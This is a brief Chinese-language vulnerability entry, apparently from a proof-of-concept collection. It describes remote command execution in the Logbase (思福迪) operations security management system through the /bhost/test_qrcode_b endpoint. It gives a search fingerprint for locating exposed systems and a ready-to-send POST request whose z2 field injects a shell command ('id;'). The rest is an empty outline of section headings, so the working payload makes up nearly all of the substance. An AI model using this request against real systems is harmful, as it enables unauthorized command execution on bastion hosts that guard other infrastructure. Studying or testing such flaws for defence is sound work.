# 思福迪运维安全管理系统test_qrcode_b存在远程命令执行漏洞

- **系统**：思福迪运维安全管理系统　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="Logbase 思福迪 运维安全系统"`
- **请求**：`POST /bhost/test_qrcode_b HTTP/1.1`

**请求体 / payload**
```
`referer`头不能删除
Host:
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
z1=1&z2="id;"&z3=bhost
```

**其他**
- 思福迪运维安全管理系统 test\_qrcode\_b存在远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 思福迪运维安全管理系统